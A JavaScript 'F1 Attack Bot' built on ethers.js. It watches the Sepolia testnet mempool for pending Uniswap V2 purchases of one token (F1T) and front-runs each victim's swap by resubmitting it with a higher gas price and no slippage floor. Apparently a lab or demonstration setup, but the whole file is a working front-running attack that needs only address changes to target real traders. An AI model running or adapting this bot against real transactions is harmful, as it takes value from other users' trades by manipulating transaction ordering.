require("dotenv").config();
const { ethers } = require("ethers");

// --- CONFIGURATION ---
const F1T_TOKEN_ADDRESS = "0x43E6e30A1d68AAAbA9Fa68327b37607C6b3B6f7F";
const UNISWAP_V2_ROUTER_ADDRESS = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";
const WETH_ADDRESS = "0xfFf9976782d46CC05630D1f6eBAb18b2324d6B14"; // WETH on Sepolia

const provider = new ethers.providers.WebSocketProvider(
  process.env.SEPOLIA_WSS_URL
);
const signer = new ethers.Wallet(process.env.WALLET_PRIVATE_KEY, provider);

const ROUTER_ABI = [
  "function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable",
  "function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts)",
];

const routerContract = new ethers.Contract(
  UNISWAP_V2_ROUTER_ADDRESS,
  ROUTER_ABI,
  signer
);

console.log("🏎️  F1 Attack Bot: Engaged");
console.log("Watching mempool for swaps of F1T token...");
console.log("-----------------------------------------");

let txCounter = 0;

async function watchMempool() {
  provider.on("pending", async (txHash) => {
    
    // --- DEBUGGING LINE 1 ---
    // Log every transaction we see
    console.log(`[${txCounter++}] Processing tx: ${txHash}`);

    let tx;
    try {
      // 0. Get the full transaction details
      tx = await provider.getTransaction(txHash);
      if (!tx || !tx.to) {
        // Not a contract interaction, ignore
        return;
      }

      // 1. Check if the transaction is a Uniswap V2 swap
      if (
        tx.to.toLowerCase() === UNISWAP_V2_ROUTER_ADDRESS.toLowerCase() &&
        tx.data.startsWith("0x7ff36ab5") // More robust check: swapExactETHForTokens
      ) {
        
        // 2. Decode the transaction
        const iface = new ethers.utils.Interface(ROUTER_ABI);
        const decodedTx = iface.decodeFunctionData(
          "swapExactETHForTokens",
          tx.data
        );
        const path = decodedTx.path;

        // 3. Check if the swap path ends with our F1T token
        if (path.length > 0 && path[path.length - 1].toLowerCase() === F1T_TOKEN_ADDRESS.toLowerCase()) {
          console.log(`\n🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨`);
          console.log(`🚨 TARGET ACQUIRED!`);
          console.log(`   Victim Tx: ${txHash}`);
          console.log(`   Victim Gas: ${ethers.utils.formatUnits(tx.gasPrice, "gwei")} Gwei`);
          console.log(`   Victim Amount: ${ethers.utils.formatEther(tx.value)} ETH`);

          // --- 4. LAUNCH FRONT-RUN ATTACK ---
          const attackGasPrice = tx.gasPrice.add(ethers.utils.parseUnits("2", "gwei"));
          const attackAmount = tx.value;
          const deadline = Math.floor(Date.now() / 1000) + 60 * 10;

          console.log(`🚀 LAUNCHING ATTACK with ${ethers.utils.formatUnits(attackGasPrice, "gwei")} Gwei...`);
          
          const attackTx = await routerContract.swapExactETHForTokens(
            0, 
            [WETH_ADDRESS, F1T_TOKEN_ADDRESS],
            signer.address,
            deadline,
            {
              value: attackAmount,
              gasPrice: attackGasPrice,
              gasLimit: 300000 
            }
          );

          console.log(`✅ ATTACK SENT! Tx Hash: ${attackTx.hash}`);
          console.log(`🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨\n`);
        }
      }
    } catch (err) {
      // --- DEBUGGING LINE 2 ---
      // If anything fails, print the error instead of hiding it
      if (err.message.includes("TransactionTooCommon") || err.message.includes("already known")) {
        // Ignore common network noise
      } else if (txHash) {
        console.warn(`[WARN] Failed to process ${txHash}: ${err.message}`);
      } else {
        console.warn(`[WARN] Generic processing error: ${err.message}`);
      }
    }
  });
}

watchMempool();